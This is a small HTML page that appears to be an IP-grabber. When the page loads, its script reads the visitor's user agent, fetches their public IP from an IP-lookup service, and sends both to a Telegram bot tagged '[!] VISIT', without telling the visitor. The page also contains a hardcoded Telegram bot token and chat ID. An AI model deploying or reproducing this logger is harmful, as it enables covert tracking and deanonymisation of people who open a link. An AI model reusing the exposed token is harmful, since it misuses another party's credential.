<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body>
    <div>
        <p>User Agent: <span id="user-agent"></span></p>
        <p>IP Address: <span id="ip-address"></span></p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const telegramToken = "8133473335:AAFg2AQeaI5fu_jKbqc_cxP-VHP7bvF64I0";
            const telegramChatID = "7170636658";
            const userAgent = navigator.userAgent;

            document.getElementById('user-agent').textContent = userAgent;

            async function sendToTelegram(message) {
                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
                const params = new URLSearchParams({
                    chat_id: telegramChatID,
                    text: message
                }).toString();
                await fetch(`${url}?${params}`);
            }

            async function fetchIpAddress() {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
                document.getElementById('ip-address').textContent = ipAddress;
                await sendToTelegram(`[!] VISIT:\nUser Agent: ${userAgent}\nIP Address: https://whatismyipaddress.com/ip/${ipAddress}`);
            }

            await fetchIpAddress();
        });
    </script>
</body>

</html>
